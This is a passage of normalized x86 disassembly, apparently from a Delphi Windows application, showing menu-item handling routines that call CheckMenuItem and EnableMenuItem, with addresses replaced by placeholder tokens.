push eax
mov eax edi
call sub_456bec
push eax
call CheckMenuItem
mov eax esi
call sub_4584e8
sub_458584
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_458658
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_456bec
push eax
call EnableMenuItem
sub_4585fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4589bc
mov edx eax
mov ecx ebx
mov eax edi
call sub_456b8c
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_4584e8
sub_458668
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418550
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_455c94
sub_4586d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_458658
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_4586c0
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4589f0
mov ecx ebx
mov edx esi
mov eax edi
call sub_4587e4
sub_458720
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458658
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458668
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_458778
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_458658
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_458668
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_458668
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4587e4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_455c94
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_456b8c
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4185cc
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_458a5c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_458658
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_456abc
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418550
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418550
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4585fc
sub_458898
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_455c94
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_458658
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_456abc
mov eax ebx
call sub_458658
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418550
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418440
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45890c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_458530
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_458640
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_458640
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_4589d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458658
mov edx eax
mov ecx esi
mov eax ebx
call sub_4587e4
pop esi
pop ebx
retn
sub_4589f0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4589bc
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_458898
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_455c94
sub_458a18
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_458a5c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_458a5c
jmp r-xdata
mov eax ebx
call sub_456abc
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45a734
sub_458ab4
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebx + 0x4c ] eax
sub_458adc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403270
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_458d70
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40346c
mov edx ebx
mov eax edi
call sub_42093c
mov eax ebx
mov si 0xffee
call sub_40346c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_458b4c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ esi + 0x4c ] eax
sub_458b80
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_458658
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_458668
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_458bc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4589f0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_4589d4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4589d4
sub_458c24
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_4584e8
sub_458c50
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4584c0
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_458530
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_458584
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40403c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4586b0
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4585fc
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45868c
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4586a0
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_458d70
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_458640
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40346c
sub_458d94
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458db4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458dd4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458df4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458e14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458e34
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458e54
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458e74
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458e94
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_458eb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c30
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4531bc
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_4532f4
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_453354
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_453054
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_453414
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458f2c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420b88
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_458640
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_458adc
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_458f80
jmp r-xdata
xor edx edx
mov eax esi
call sub_456a44
sub_458f80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_454418
mov eax ebx
call sub_458ff0
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_45445c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_42093c
sub_458fc8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_458fc8
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_456118
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_458a5c
mov eax ebx
pop esi
pop ebx
retn
sub_459004
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c314
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404548
sub_459034
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404080
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4590b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4591da
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042a8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042a8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404508
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043f4
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4591e1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40400c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404590
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404368
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042a8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404508
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404368
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_459218
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4596b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404080
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_459678
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_458658
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404080
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4596be
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40400c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40400c
lea eax [ ebp - 0x18 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
call sub_45986c
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_458668
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043f4
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_459034
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_458668
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458668
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403270
mov eax [ ebp - 0x20 ]
call sub_403270
mov eax [ ebp - 0x14 ]
call sub_403270
mov eax [ ebp - 0xc ]
call sub_403270
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_459034
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042a8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_458668
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45b314
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407dc4
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40403c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c314
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c314
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_458668
push eax
mov edx esi
mov eax ebx
call sub_458668
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404508
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407dc4
push ebp
mov eax [ ebp - 0x2c ]
call sub_459004
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_459004
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c314
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404080
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458668
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_458668
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45b280
mov edx [ ebp - 0x40 ]
pop eax
call sub_40403c
mov edx esi
mov eax ebx
call sub_458668
push eax
mov edx esi
mov eax ebx
call sub_458668
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042a8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404508
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4590b8
mov eax [ ebp - 0x18 ]
call sub_4042a8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404548
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404590
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4590b8
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
